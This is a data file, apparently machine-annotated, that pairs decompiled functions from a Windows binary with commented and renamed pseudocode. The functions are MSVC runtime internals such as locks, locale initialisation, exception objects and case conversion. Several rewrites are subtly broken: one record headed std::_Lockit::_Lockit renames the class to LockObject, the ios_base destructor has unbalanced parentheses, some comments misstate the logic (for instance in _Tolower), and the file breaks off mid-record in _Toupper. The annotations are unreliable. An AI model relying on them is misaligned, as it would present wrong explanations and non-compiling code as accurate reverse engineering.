{"Function Name": "std::_Init_locks::_Init_locks", "Address": "14000952c", "Source Code": "\\*\n_Init_locks * __thiscall std::_Init_locks::_Init_locks(_Init_locks *this)\n{\n    // Define a pointer to a critical section structure\n    LPCRITICAL_SECTION criticalSectionPtr = (LPCRITICAL_SECTION)&criticalSectionData;\n    \n    // Initialize a counter variable\n    longlong sectionCount = 8;\n    \n    // Acquire a lock\n    LOCK();\n    \n    // Increment the global initialization counter\n    globalInitCounter++;\n    \n    // Release the lock\n    UNLOCK();\n    \n    // Check if the initialization counter is zero\n    if (globalInitCounter == 0) {\n        // Loop through and initialize critical sections\n        do {\n            // Call a function to initialize the critical section pointed by p_Var1\n            FUN_14000a008(criticalSectionPtr);\n            // Move to the next critical section\n            criticalSectionPtr++;\n        } while (--sectionCount != 0); // Continue until all sections are initialized\n    }\n    \n    // Return the current instance of _Init_locks\n    return this;\n}\n*\\ \n \n\n_Init_locks * __thiscall std::_Init_locks::_Init_locks(_Init_locks *this)\n{\nLPCRITICAL_SECTION criticalSectionPtr = (LPCRITICAL_SECTION)&criticalSectionData;\nlonglong sectionCount = 8;\nLOCK();\nglobalInitCounter++;\nUNLOCK();\nif (globalInitCounter == 0) {\n    do {\n        FUN_14000a008(criticalSectionPtr);\n        criticalSectionPtr++;\n    } while (--sectionCount != 0);\n}\nreturn this;\n}\n"}
{"Function Name": "std::_Lockit::_Lockit", "Address": "140009578", "Source Code": "\\*\nLockObject * __thiscall std::LockObject::LockObject(LockObject *currentInstance, int inputParam)\n{\n    // Assign the value of param_1 to the current object's integer field\n    *(int *)currentInstance = inputParam;\n\n    // Check if param_1 is zero\n    if (inputParam == 0) {\n        // Lock the local environments\n        _lock_locales();\n    } \n    // Check if param_1 is less than 8\n    else if (inputParam < 8) {\n        // Enter the critical section associated with the specific index\n        EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_140039130 + (longlong)inputParam * 0x28));\n    }\n\n    // Return the current object\n    return currentInstance;\n}\n*\\ \n \n\nLockObject * __thiscall std::LockObject::LockObject(LockObject *currentInstance, int inputParam)\n{\n    *(int *)currentInstance = inputParam;\n    if (inputParam == 0) {\n        _lock_locales();\n    } else if (inputParam < 8) {\n        EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_140039130 + (longlong)inputParam * 0x28));\n    }\n    return currentInstance;\n}\n"}
{"Function Name": "FUN_1400095b4", "Address": "1400095b4", "Source Code": "\nvoid FUN_1400095b4(void) // Function definition\n{\n    int decrementedValue; // Variable to hold the decremented value\n    LPCRITICAL_SECTION criticalSectionPointer; // Pointer to a critical section\n    longlong loopCounter; // Variable to control loop iterations\n    LOCK(); // Acquire lock to ensure thread safety\n    decrementedValue = DAT_140038000 + -1; // Decrement the global counter\n    DAT_140038000 = decrementedValue; // Update the global counter\n    UNLOCK(); // Release the lock\n\n    if (decrementedValue < 0) { // Check if the counter is negative\n        criticalSectionPointer = (LPCRITICAL_SECTION)&DAT_140039130; // Initialize critical section pointer\n        loopCounter = 8; // Set loop counter to 8\n        do {\n            DeleteCriticalSection(criticalSectionPointer); // Delete the critical section\n            criticalSectionPointer++; // Move to the next critical section\n            loopCounter--; // Decrement loop counter\n        } while (loopCounter != 0); // Continue until all sections are deleted\n    }\n    return; // Exit the function\n}\n"}
{"Function Name": "std::_Lockit::~_Lockit", "Address": "1400095f8", "Source Code": "\nvoid __thiscall std::_Lockit::~_Lockit(_Lockit *currentObject)\n{\n    // Check if the current object pointer is null\n    if (*(int *)currentObject == 0) {\n        // Call a function if the object is null\n        handleNullObject();\n        return; // Exit the function\n    }\n    // Check if the value pointed to by 'this' is less than 8\n    if (*(int *)currentObject < 8) {\n        // Leave the critical section associated with the calculated address\n        exitCriticalSection((LPCRITICAL_SECTION)(&criticalSectionBase + (*(int *)currentObject * 0x28)));\n    }\n}\n"}
{"Function Name": "FUN_14000962c", "Address": "14000962c", "Source Code": "\nvoid FUN_14000962c(longlong *executionBlock, undefined *initParams, undefined8 executionContext)\n{\n    // Initialize a one-time execution block using the provided parameters\n    __crtInitOnceExecuteOnce(executionBlock, initParams, executionContext, 0);\n}\n"}
{"Function Name": "FUN_140009634", "Address": "140009634", "Source Code": "\nundefined8 * FUN_140009634(undefined8 *exception_pointer,longlong exception_data)\n{\n    // Set the first element of param_1 to the vftable of std::bad_alloc\n    *exception_pointer = std::bad_alloc::vftable;\n    \n    // Initialize the second element of param_1 to 0\n    exception_pointer[1] = 0;\n    \n    // Initialize the third element of param_1 to 0\n    exception_pointer[2] = 0;\n    \n    // Copy exception data from the memory location (param_2 + 8) to param_1 + 1\n    __std_exception_copy((longlong *)(exception_data + 8), exception_pointer + 1);\n    \n    // Return the modified param_1\n    return exception_pointer;\n}\n"}
{"Function Name": "FUN_140009670", "Address": "140009670", "Source Code": "\nundefined8 * FUN_140009670(undefined8 *array_pointer)\n{\n    // Set the third element of the array pointed to by param_1 to 0\n    array_pointer[2] = 0;\n\n    // Set the second element of the array to the string \"bad allocation\"\n    array_pointer[1] = \"bad allocation\";\n\n    // Set the first element of the array to the vftable of std::bad_alloc\n    *array_pointer = std::bad_alloc::vftable;\n\n    // Return the modified pointer param_1\n    return array_pointer;\n}\n"}
{"Function Name": "FUN_140009690", "Address": "140009690", "Source Code": "\nundefined8 * FUN_140009690(undefined8 *exception_ptr,longlong exception_data)\n{\n    // Set the first element of param_1 to the vftable of std::length_error\n    *exception_ptr = std::length_error::vftable;\n    \n    // Initialize the second element of param_1 to 0\n    exception_ptr[1] = 0;\n    \n    // Initialize the third element of param_1 to 0\n    exception_ptr[2] = 0;\n    \n    // Copy exception data from the memory location (param_2 + 8) to param_1 + 1\n    __std_exception_copy((longlong *)(exception_data + 8), exception_ptr + 1);\n    \n    // Return the modified param_1\n    return exception_ptr;\n}\n"}
{"Function Name": "FUN_1400096cc", "Address": "1400096cc", "Source Code": "\nundefined8 * FUN_1400096cc(undefined8 *exception_pointer,longlong exception_data)\n{\n    // Set the first element of param_1 to the vftable of std::length_error\n    *exception_pointer = std::length_error::vftable;\n    \n    // Initialize the second element of param_1 to 0\n    exception_pointer[1] = 0;\n    \n    // Initialize the third element of param_1 to 0\n    exception_pointer[2] = 0;\n    \n    // Copy the exception data from param_2 to the second element of param_1\n    __std_exception_copy(&exception_data, exception_pointer + 1);\n    \n    // Return the modified param_1\n    return exception_pointer;\n}\n"}
{"Function Name": "FUN_140009714", "Address": "140009714", "Source Code": "\nundefined8 * FUN_140009714(undefined8 *exception_ptr,longlong exception_data)\n{\n    // Set the first element of param_1 to the vftable of std::logic_error\n    *exception_ptr = std::logic_error::vftable;\n\n    // Initialize the second element of param_1 to 0\n    exception_ptr[1] = 0;\n\n    // Initialize the third element of param_1 to 0\n    exception_ptr[2] = 0;\n\n    // Copy exception data from the address (param_2 + 8) to the second element of param_1\n    __std_exception_copy((longlong *)(exception_data + 8), exception_ptr + 1);\n\n    // Return the modified param_1\n    return exception_ptr;\n}\n"}
{"Function Name": "FUN_140009750", "Address": "140009750", "Source Code": "\nvoid FUN_140009750(longlong input_param)\n{\n    code *function_pointer; // Declare a pointer to a function (code type)\n    \n    FUN_1400096cc(&local_data, input_param); // Call FUN_1400096cc with local_28 and param_1 as arguments\n    \n    FUN_14000c234(&local_data, &DAT_140036048); // Call FUN_14000c234 with local_28 and a constant data reference\n    \n    function_pointer = (code *)swi(3); // Call swi(3) and cast the result to a function pointer, storing it in pcVar1\n    \n    (*function_pointer)(); // Dereference pcVar1 and call the function it points to\n}\n"}
{"Function Name": "FUN_140009774", "Address": "140009774", "Source Code": "\nvoid FUN_140009774(longlong input_param)\n{\n    code *function_pointer; // Declare a pointer to a function (code type)\n    \n    FUN_140001b60(local_variable, input_param); // Call FUN_140001b60 with local_28 and param_1 as arguments\n    \n    FUN_14000c234(local_variable, &data_reference); // Call FUN_14000c234 with local_28 and a data reference as arguments\n    \n    function_pointer = (code *)swi(3); // Call swi(3) and cast the result to a function pointer, storing it in pcVar1\n    \n    (*function_pointer)(); // Call the function pointed to by pcVar1\n}\n"}
{"Function Name": "std::_Yarn<char>::operator=", "Address": "140009798", "Source Code": "\\*\n_Yarn<char> * __thiscall std::_Yarn<char>::operator=(_Yarn<char> *this, char *newStringPtr)\n{\n    // Retrieve the current string pointer from the _Yarn object\n    char *currentStringPtr = *(char **)this;\n\n    // Check if the current string pointer is not the same as the new string pointer\n    if (currentStringPtr != newStringPtr) {\n        // If the current string pointer is not null, free the existing string\n        if (currentStringPtr != (char *)0x0) {\n            FUN_14000ead0(currentStringPtr); // Free the memory allocated for the current string\n        }\n\n        // Set the current string pointer to null\n        *(undefined8 *)this = 0;\n\n        // If the new string pointer is not null\n        if (newStringPtr != (char *)0x0) {\n            // Find the end of the new string\n            char *newStringEnd = newStringPtr;\n            while (*newStringEnd != '\\0') {\n                newStringEnd++; // Increment to find the null terminator\n            }\n\n            // Allocate memory for the new string including the null terminator\n            undefined8 *allocatedMemory = (undefined8 *)_malloc_base((ulonglong)(newStringEnd + (1 - (longlong)newStringPtr)));\n            *(undefined8 **)this = allocatedMemory; // Assign the newly allocated memory to the _Yarn object\n\n            // If memory allocation was successful\n            if (allocatedMemory != (undefined8 *)0x0) {\n                // Copy the contents of the new string into the allocated memory\n                FUN_14000c330(allocatedMemory, (undefined8 *)newStringPtr, (ulonglong)(newStringEnd + (1 - (longlong)newStringPtr)));\n            }\n        }\n    }\n\n    // Return the current _Yarn object\n    return this;\n}\n*\\ \n \n\n_Yarn<char> * __thiscall std::_Yarn<char>::operator=(_Yarn<char> *this, char *newStringPtr)\n{\n    char *currentStringPtr = *(char **)this;\n    if (currentStringPtr != newStringPtr) {\n        if (currentStringPtr != (char *)0x0) {\n            FUN_14000ead0(currentStringPtr);\n        }\n        *(undefined8 *)this = 0;\n        if (newStringPtr != (char *)0x0) {\n            char *newStringEnd = newStringPtr;\n            while (*newStringEnd != '\\0') {\n                newStringEnd++;\n            }\n            undefined8 *allocatedMemory = (undefined8 *)_malloc_base((ulonglong)(newStringEnd + (1 - (longlong)newStringPtr)));\n            *(undefined8 **)this = allocatedMemory;\n            if (allocatedMemory != (undefined8 *)0x0) {\n                FUN_14000c330(allocatedMemory, (undefined8 *)newStringPtr, (ulonglong)(newStringEnd + (1 - (longlong)newStringPtr)));\n            }\n        }\n    }\n    return this;\n}\n"}
{"Function Name": "std::locale::_Locimp::`scalar_deleting_destructor'", "Address": "140009810", "Source Code": "\nvoid * __thiscall std::locale::locale_impl::_scalar_deleting_destructor_(_Locimp *current_object, uint flags)\n{\n    // Set the vtable pointer for the current object\n    *(undefined ***)current_object = vtable_pointer;\n\n    // Call the destructor for the _Locimp object\n    locale_impl_destructor(current_object);\n\n    // Check if the pointer at offset 0x28 is not null\n    if (*(LPVOID *)(current_object + 0x28) != (LPVOID)0x0) {\n        // Call a function with the pointer at offset 0x28\n        function_with_pointer(*(LPVOID *)(current_object + 0x28));\n    }\n\n    // Set the pointer at offset 0x28 to null\n    *(undefined8 *)(current_object + 0x28) = 0;\n\n    // Reset the vtable pointer to the base class vtable\n    *(undefined ***)current_object = base_facet::vtable_pointer;\n\n    // If the first bit of param_1 is set, call the thunk function\n    if ((flags & 1) != 0) {\n        thunk_FUN_14000b460();\n    }\n\n    // Return the current object\n    return current_object;\n}\n"}
{"Function Name": "std::_Facet_Register", "Address": "14000987c", "Source Code": "\nvoid __cdecl std::_Facet_Register(_Facet_base *facetBase)\n{\n    // Allocate 16 bytes of memory for a new object\n    undefined8 *allocatedMemory = (undefined8 *)operator_new(0x10);\n    \n    // Check if memory allocation was successful\n    if (allocatedMemory != (undefined8 *)0x0) {\n        // Assign a value from a global variable to the first element\n        *allocatedMemory = globalFacetPointer;\n        \n        // Store the passed parameter in the second element\n        allocatedMemory[1] = facetBase;\n    }\n    \n    // Update the global variable to point to the newly allocated memory\n    globalFacetPointer = allocatedMemory;\n}\n"}
{"Function Name": "FUN_1400098b4", "Address": "1400098b4", "Source Code": "\nundefined8 FUN_1400098b4(void) // Function definition with return type undefined8\n{\n    return global_variable_value; // Return the value of the global variable DAT_1400392c8\n}\n"}
{"Function Name": "std::locale::_Init", "Address": "1400098bc", "Source Code": "\\*\n_Locimp * __cdecl std::locale::_Init(bool isThreadSafe)\n{\n    _Locimp *currentLocaleImpl = initialLocaleImpl; // Retrieve the current locale implementation\n    _Lockit lockObject[8]; // Declare a lock object for thread safety\n    _Lockit::_Lockit(lockObject, 0); // Initialize the lock object\n    \n    if (currentLocaleImpl == (_Locimp *)0x0) { // Check if the locale implementation is null\n        currentLocaleImpl = _Locimp::_New_Locimp(false); // Create a new locale implementation\n        _Setgloballocale(currentLocaleImpl); // Set the new locale as the global locale\n        *(undefined4 *)(currentLocaleImpl + 0x20) = 0x3f; // Set a specific value in the locale implementation\n        _Yarn<char>::operator=((_Yarn<char> *)(currentLocaleImpl + 0x28), \"C\"); // Initialize the locale with \"C\"\n        newLocaleImpl = currentLocaleImpl; // Store the new locale implementation\n        (*(code *)PTR__guard_dispatch_icall_1400213e8)(currentLocaleImpl); // Call a guard function for thread safety\n        updatedLocaleRef = newLocaleImpl; // Update another reference to the new locale\n    }\n    \n    if (isThreadSafe) { // If the parameter is true\n        (*(code *)PTR__guard_dispatch_icall_1400213e8)(currentLocaleImpl); // Call the guard function again\n    }\n    \n    _Lockit::~_Lockit(lockObject); // Destroy the lock object\n    return currentLocaleImpl; // Return the locale implementation\n}\n*\\ \n \n\n_Locimp * __cdecl std::locale::_Init(bool isThreadSafe)\n{\n    _Locimp *currentLocaleImpl = initialLocaleImpl;\n    _Lockit lockObject[8];\n    _Lockit::_Lockit(lockObject, 0);\n    \n    if (currentLocaleImpl == (_Locimp *)0x0) {\n        currentLocaleImpl = _Locimp::_New_Locimp(false);\n        _Setgloballocale(currentLocaleImpl);\n        *(undefined4 *)(currentLocaleImpl + 0x20) = 0x3f;\n        _Yarn<char>::operator=((_Yarn<char> *)(currentLocaleImpl + 0x28), \"C\");\n        newLocaleImpl = currentLocaleImpl;\n        (*(code *)PTR__guard_dispatch_icall_1400213e8)(currentLocaleImpl);\n        updatedLocaleRef = newLocaleImpl;\n    }\n    \n    if (isThreadSafe) {\n        (*(code *)PTR__guard_dispatch_icall_1400213e8)(currentLocaleImpl);\n    }\n    \n    _Lockit::~_Lockit(lockObject);\n    return currentLocaleImpl;\n}\n"}
{"Function Name": "std::locale::_Locimp::_Locimp_dtor", "Address": "140009968", "Source Code": "\nvoid __cdecl std::locale::_Locimp::_Locimp_dtor(_Locimp *localeImplementation)\n{\n    longlong guardDispatchResult; // Variable to hold a long long value for guard dispatch\n    longlong loopCounter; // Variable to iterate through a loop\n    _Lockit lockManager [8]; // Local variable for lock management\n    _Lockit::_Lockit(lockManager, 0); // Initialize the lock\n\n    loopCounter = *(longlong *)(localeImplementation + 0x18); // Get the value at offset 0x18 from param_1\n    while (loopCounter != 0) { // Loop while lVar2 is not zero\n        loopCounter--; // Decrement lVar2\n        if (*(longlong *)(*(longlong *)(localeImplementation + 0x10) + loopCounter * 8) != 0) { // Check if the value at calculated address is not zero\n            guardDispatchResult = (*(code *)PTR__guard_dispatch_icall_1400213e8)(); // Call guard dispatch and store the result in lVar1\n            if (guardDispatchResult != 0) { // If lVar1 is not zero\n                (*(code *)PTR__guard_dispatch_icall_1400213e8)(guardDispatchResult, 1); // Call guard dispatch with lVar1 and argument 1\n            }\n        }\n    }\n    FUN_14000ead0(*(LPVOID *)(localeImplementation + 0x10)); // Call FUN_14000ead0 with the value at offset 0x10 from param_1\n    _Lockit::~_Lockit(lockManager); // Destroy the lock\n    return; // Return from the function\n}\n"}
{"Function Name": "std::_Locinfo::_Locinfo_ctor", "Address": "1400099e4", "Source Code": "\nvoid __cdecl std::_Locinfo::_Locinfo_ctor(_Locinfo *locinfo, char *new_locale)\n{\n    // Get the current locale setting; pass 0 to retrieve the current locale\n    char *current_locale = setlocale(0, (char *)0x0);\n    \n    // If no locale is set, default to an empty string\n    if (current_locale == (char *)0x0) {\n        current_locale = \"\";\n    }\n    \n    // Assign the current locale to a member of _Locinfo structure\n    _Yarn<char>::operator=((_Yarn<char> *)(locinfo + 0x48), current_locale);\n    \n    // If a new locale is provided, set it and update the locale variable\n    if (new_locale != (char *)0x0) {\n        new_locale = setlocale(0, new_locale);\n    }\n    \n    // If the new locale is still not set, default to \"*\"\n    if (new_locale == (char *)0x0) {\n        new_locale = \"*\";\n    }\n    \n    // Assign the new locale (or default) to another member of _Locinfo structure\n    _Yarn<char>::operator=((_Yarn<char> *)(locinfo + 0x58), new_locale);\n}\n"}
{"Function Name": "std::_Locinfo::_Locinfo_dtor", "Address": "140009a50", "Source Code": "\nvoid __cdecl std::_Locinfo::_Locinfo_dtor(_Locinfo *locinfo_ptr)\n{\n    // Declare a pointer to a char pointer, pointing to the locale member of _Locinfo structure\n    char **locale_ptr = (char **)(locinfo_ptr + 0x48);\n    \n    // Check if the locale pointer is not null\n    if (*locale_ptr != (char *)0x0) {\n        // Set the locale using the value pointed to by locale\n        setlocale(0, *locale_ptr);\n    }\n}\n"}
{"Function Name": "std::locale::_Locimp::_New_Locimp", "Address": "140009a6c", "Source Code": "\\*\n_Locimp * __cdecl std::locale::_Locimp::_New_Locimp(bool is_param)\n{\n    // Allocate memory for a new _Locimp object\n    _Locimp *locimp_instance = (_Locimp *)operator_new(0x38);\n    \n    // Check if memory allocation was successful\n    if (locimp_instance != (_Locimp *)0x0) {\n        // Initialize the first member (presumably a status or flag) to 1\n        *(undefined4 *)(locimp_instance + 8) = 1;\n        \n        // Initialize the second member (presumably a pointer) to null\n        *(undefined8 *)(locimp_instance + 0x10) = 0;\n        \n        // Initialize the third member (another pointer) to null\n        *(undefined8 *)(locimp_instance + 0x18) = 0;\n        \n        // Initialize the fourth member (presumably a count or size) to 0\n        *(undefined4 *)(locimp_instance + 0x20) = 0;\n        \n        // Set the vftable pointer for the object\n        *(undefined ***)locimp_instance = virtual_table;\n        \n        // Store the parameter value in the 0x24 offset\n        locimp_instance[0x24] = (_Locimp)is_param;\n        \n        // Initialize another member (presumably a pointer) to null\n        *(undefined8 *)(locimp_instance + 0x28) = 0;\n        \n        // Initialize the last member (presumably a pointer) to null\n        locimp_instance[0x30] = (_Locimp)0x0;\n        \n        // Assign a default string value to the member at offset 0x28\n        _Yarn<char>::operator=((_Yarn<char> *)(locimp_instance + 0x28), \"*\");\n    }\n    \n    // Return the newly created _Locimp object or null if allocation failed\n    return locimp_instance;\n}\n*\\ \n \n\n_Locimp * __cdecl std::locale::_Locimp::_New_Locimp(bool is_param)\n{\n    _Locimp *locimp_instance = (_Locimp *)operator_new(0x38);\n    if (locimp_instance != (_Locimp *)0x0) {\n        *(undefined4 *)(locimp_instance + 8) = 1;\n        *(undefined8 *)(locimp_instance + 0x10) = 0;\n        *(undefined8 *)(locimp_instance + 0x18) = 0;\n        *(undefined4 *)(locimp_instance + 0x20) = 0;\n        *(undefined ***)locimp_instance = virtual_table;\n        locimp_instance[0x24] = (_Locimp)is_param;\n        *(undefined8 *)(locimp_instance + 0x28) = 0;\n        locimp_instance[0x30] = (_Locimp)0x0;\n        _Yarn<char>::operator=((_Yarn<char> *)(locimp_instance + 0x28), \"*\");\n    }\n    return locimp_instance;\n}\n"}
{"Function Name": "std::locale::_Setgloballocale", "Address": "140009adc", "Source Code": "\nvoid __cdecl std::locale::_Setgloballocale(void *locale_param)\n{\n    // Check if the global flag DAT_1400392d0 is not set\n    if (global_flag == '\\0') {\n        // Set the global flag DAT_1400392d0 to indicate it is now set\n        global_flag = '\\x01';\n        // Register the function FUN_140009b4c to be called at program exit\n        _Atexit(FUN_140009b4c);\n    }\n    // Set the global locale pointer DAT_1400392c8 to the provided parameter\n    global_locale_pointer = locale_param;\n}\n"}
{"Function Name": "_Deletegloballocale", "Address": "140009b10", "Source Code": "\nvoid _Deletegloballocale(longlong *localPointer)\n{\n    // Check if the value pointed to by param_1 is not zero\n    if (*localPointer != 0) {\n        // Call a function via a function pointer and store the result in lVar1\n        longlong functionResult = (*(code *)PTR__guard_dispatch_icall_1400213e8)();\n        \n        // If lVar1 is not zero, call the function again with lVar1 and argument 1\n        if (functionResult != 0) {\n            (*(code *)PTR__guard_dispatch_icall_1400213e8)(functionResult, 1);\n        }\n    }\n}\n"}
{"Function Name": "FUN_140009b4c", "Address": "140009b4c", "Source Code": "\nvoid FUN_140009b4c(void)\n{\n    // Create a lock object to manage thread safety\n    std::_Lockit lock_object(0);\n    \n    // Delete the global locale object pointed to by DAT_1400392c8\n    _Deletegloballocale(&global_locale_pointer);\n    \n    // Set the global locale pointer to null\n    global_locale_pointer = 0;\n}\n"}
{"Function Name": "std::ios_base::_Ios_base_dtor", "Address": "140009b88", "Source Code": "\nvoid __cdecl std::ios_base::_Ios_base_dtor(ios_base *ios_base_instance) // Destructor for ios_base class\n{\n    longlong reference_count = *(longlong *)(ios_base_instance + 8); // Retrieve reference count from the object\n    if ((reference_count == 0) || ((&reference_count_array)[reference_count] = (&reference_count_array)[reference_count] - 1, (char)(&reference_count_array)[reference_count] < '\\x01')) ) { // Check if reference count is zero or decrement it and check if it falls below 1\n        cleanup_function((longlong)ios_base_instance); // Call cleanup function if reference count is zero\n        if (*(longlong *)(ios_base_instance + 0x40) != 0) { // Check if there is a valid pointer at offset 0x40\n            if (*(longlong *)(*(longlong *)(ios_base_instance + 0x40) + 8) != 0) { // Check if the pointer at offset 0x40 has a valid reference count\n                reference_count = (*(code *)guard_dispatch_function)(); // Call guard dispatch function\n                if (reference_count != 0) { // If the guard dispatch function returns a non-zero value\n                    (*(code *)guard_dispatch_function)(reference_count, 1); // Call guard dispatch function again with the returned value\n                }\n            }\n            another_cleanup_function(); // Call another cleanup function\n        }\n    }\n}\n"}
{"Function Name": "FUN_140009c00", "Address": "140009c00", "Source Code": "\nvoid FUN_140009c00(longlong context, undefined8 arg2, undefined8 arg3, undefined8 arg4)\n{\n    undefined8 *currentNode;\n    \n    // Iterate through the linked list starting at the address stored at (param_1 + 0x38)\n    for (currentNode = *(undefined8 **)(context + 0x38); currentNode != (undefined8 *)0x0; currentNode = (undefined8 *)*currentNode) {\n        // Call the function pointed to by PTR__guard_dispatch_icall_1400213e8 with parameters\n        // 0, param_1, and the value at (puVar1 + 1)\n        (*(code *)dispatchFunction)(0, context, *(undefined4 *)(currentNode + 1));\n    }\n    \n    // Get the head of another linked list from (param_1 + 0x30)\n    currentNode = *(undefined8 **)(context + 0x30);\n    // Iterate through this linked list\n    while (currentNode != (undefined8 *)0x0) {\n        currentNode = (undefined8 *)*currentNode; // Move to the next node\n        thunkFunction(); // Call the thunk function\n    }\n    \n    // Set the head of the linked list at (param_1 + 0x30) to null\n    *(undefined8 *)(context + 0x30) = 0;\n\n    // Get the head of the first linked list again from (param_1 + 0x38)\n    currentNode = *(undefined8 **)(context + 0x38);\n    // Iterate through this linked list again\n    while (currentNode != (undefined8 *)0x0) {\n        currentNode = (undefined8 *)*currentNode; // Move to the next node\n        thunkFunction(); // Call the thunk function\n    }\n    \n    // Set the head of the linked list at (param_1 + 0x38) to null\n    *(undefined8 *)(context + 0x38) = 0;\n}\n"}
{"Function Name": "FUN_140009c8c", "Address": "140009c8c", "Source Code": "\nundefined8 * FUN_140009c8c(undefined8 *array_pointer, undefined8 value_to_assign)\n{\n    // Assign the value of param_2 to the second element of the array pointed to by param_1\n    array_pointer[1] = value_to_assign;\n    \n    // Set the first element of the array pointed to by param_1 to the address of LAB_140009ca0\n    *array_pointer = &LAB_140009ca0;\n    \n    // Return the modified pointer param_1\n    return array_pointer;\n}\n"}
{"Function Name": "FUN_140009ca8", "Address": "140009ca8", "Source Code": "\nchar * findStringByParam(int inputValue)\n{\n    int *dataPointer = &dataStructureStart; // Initialize pointer to the start of the data structure\n    do {\n        if (*dataPointer == inputValue) { // Check if the current value matches the input parameter\n            return *(char **)(dataPointer + 2); // Return the corresponding string if a match is found\n        }\n        dataPointer += 4; // Move to the next entry in the data structure\n    } while (dataPointer != (int *)\"address family not supported\"); // Continue until the end of the data structure is reached\n    return \"unknown error\"; // Return a default error message if no match is found\n}\n"}
{"Function Name": "FUN_140009cd0", "Address": "140009cd0", "Source Code": "\nUINT * FUN_140009cd0(UINT *localeParams)\n{\n    // Retrieve the current locale code page\n    UINT currentLocaleCodePage = ___lc_codepage_func();\n    // Store the code page in the first element of param_1\n    *localeParams = currentLocaleCodePage;\n\n    // Allocate memory for 256 elements of 2 bytes each\n    LPVOID allocatedMemory = _calloc_base(0x100, 2);\n    // Store the allocated memory pointer in the third element of param_1\n    *(LPVOID *)(localeParams + 2) = allocatedMemory;\n\n    // Check if memory allocation was successful\n    if (allocatedMemory == (LPVOID)0x0) {\n        // If allocation failed, retrieve the character type information\n        *(ushort **)(localeParams + 2) = __pctype_func();\n        // Set the fifth element of param_1 to 0 indicating failure\n        localeParams[4] = 0;\n    } else {\n        // Retrieve the character type information\n        ushort *characterTypeInfo = __pctype_func();\n        // Get the pointer to the allocated memory\n        undefined8 *allocatedMemoryPtr = *(undefined8 **)(localeParams + 2);\n        \n        // Loop to copy character type information into allocated memory\n        for (longlong copyCount = 4; copyCount != 0; copyCount--) {\n            for (int index = 0; index < 8; index++) {\n                // Copy two 8-byte values from puVar5 to puVar8\n                allocatedMemoryPtr[index * 2] = *(undefined8 *)(characterTypeInfo + (index * 8));\n                allocatedMemoryPtr[index * 2 + 1] = *(undefined8 *)(characterTypeInfo + (index * 8 + 4));\n            }\n            // Move to the next block of character type information\n            characterTypeInfo += 0x40;\n            allocatedMemoryPtr += 0x10;\n        }\n        // Set the fifth element of param_1 to 1 indicating success\n        localeParams[4] = 1;\n    }\n\n    // Retrieve the locale name\n    wchar_t **localeNameArray = ___lc_locale_name_func();\n    // Get the second element of the locale name array\n    wchar_t *localeName = localeNameArray[1];\n    // Duplicate the locale name string if it exists, otherwise set it to NULL\n    *(wchar_t **)(localeParams + 6) = localeName ? _wcsdup(localeName) : localeName;\n\n    // Return the modified param_1 pointer\n    return localeParams;\n}\n"}
{"Function Name": "_Tolower", "Address": "140009d90", "Source Code": "\nint __cdecl _Tolower(int character,_Ctypevec *ctype_vector)\n{\n    UINT code_page; // Variable to hold the code page\n    _locale_t locale_info; // Variable to hold locale information\n    LPCSTR source_string_type; // Pointer to source string type\n    byte converted_character; // Variable to store the result of conversion\n\n    // Check if the provided _Ctypevec pointer is null\n    if (ctype_vector == (_Ctypevec *)0x0) {\n        // Get the locale name from the system\n        locale_info = (_locale_t)___lc_locale_name_func()[2];\n        // Get the current code page\n        code_page = ___lc_codepage_func();\n    }\n    else {\n        // Use the locale name and code page from the provided _Ctypevec\n        locale_info = (_locale_t)ctype_vector->_LocaleName;\n        code_page = ctype_vector->_Page;\n    }\n\n    // Check if the locale information is null\n    if (locale_info == (_locale_t)0x0) {\n        // Check if the character is outside the uppercase range\n        if (0x19 < character - 0x41U) {\n            return character; // Return the character unchanged\n        }\n        return character + 0x20; // Convert to lowercase\n    }\n\n    // Check if the character is within the ASCII range\n    if ((uint)character < 0x100) {\n        // If _Ctypevec is provided\n        if (ctype_vector != (_Ctypevec *)0x0) {\n            // Check if the character is not a lowercase letter\n            if ((*(byte *)(ctype_vector->_Table + character) & 1) == 0) {\n                return character; // Return the character unchanged\n            }\n        } else if (isupper(character) == 0) {\n            return character; // Return the character unchanged\n        }\n    }\n\n    // If _Ctypevec is provided\n    if (ctype_vector != (_Ctypevec *)0x0) {\n        // Check if the character is a special case in the _Table\n        if ((uint)(int)ctype_vector->_Table[(longlong)character >> 8 & 0xff] >> 0xf & 1) {\n            source_string_type = (LPCSTR)0x2; // Set source string type for special case\n            character = (char)((uint)character >> 8); // Adjust the character\n        } else {\n            source_string_type = (LPCSTR)0x1; // Set source string type for normal case\n        }\n    } else {\n        source_string_type = (LPCSTR)0x1; // Set source string type for default case\n    }\n\n    converted_character = (char)character; // Store the character to be converted\n    // Call the locale-specific string mapping function\n    int mapping_result = __crtLCMapStringA(locale_info,(LPCWSTR)0x100,(DWORD)&converted_character,source_string_type,(int)&converted_character,(LPSTR)0x3,code_page,1,0);\n    \n    // Check if the mapping was successful and adjust the character if needed\n    if ((mapping_result != 0) && (character = (int)converted_character, mapping_result != 1)) {\n        character = (int)CONCAT11(converted_character,0); // Update the character with the result\n    }\n    \n    return character; // Return the converted character\n}\n"}
{"Function Name": "_Toupper", "Address": "140009ec0", "Source Code": "\nint __cdecl _Toupper(int input_char,_Ctypevec *ctype_vector)\n{\n    UINT code_page; // Variable to hold the code page\n    _locale_t locale_info; // Variable to hold locale information\n    uint char_type_flag; // Variable to hold a flag for character type\n    uint conversion_needed_flag; // Variable to determine if character conversion is needed\n\n    // Check if the provided _Ctypevec pointer is null\n    if (ctype_vector == (_Ctypevec *)0x0) {\n        // Get the locale information from the system\n        locale_info = (_locale_t)___lc_locale_name_func()[2];\n        // Get the default code page\n        code_page = ___lc_codepage_func();\n    }\n    else {\n        // Use the provided locale information and code page\n        locale_info = (_locale_t)ctype_vector->_LocaleName;\n        code_page = ctype_vector->_Page;\n    }\n\n    // Check if locale information is valid\n    if (locale_info == (_locale_t)0x0) {\n        // If the character is not a lowercase letter, return it unchanged\n        return (0x19 < input_char - 0x61U) ? input_char : input_char - 0x20;\n    }\n\n    conversion_needed_flag = 2; // Set default value for conversion flag\n\n    // Check if the character is within the ASCII range\n    if ((uint)input_char < 0x100) {\n        // If a _Ctypevec is provided\n        if (ctype_vector != (_Ctypevec *)0x0) {\n            // Check if the character is not a lowercase letter\n            if ((*(byte *)(ctype_vector->_Table + input_char) & 2) == 0) {\n                return input_char; // Return the character unchanged\n            }\n        } else if (islower(input_char) == 0) {\n            return input_char; // Return the character unchanged\n        }\n    } else {\n        // For characters outside the ASCII range\n        if (ctype_vector != 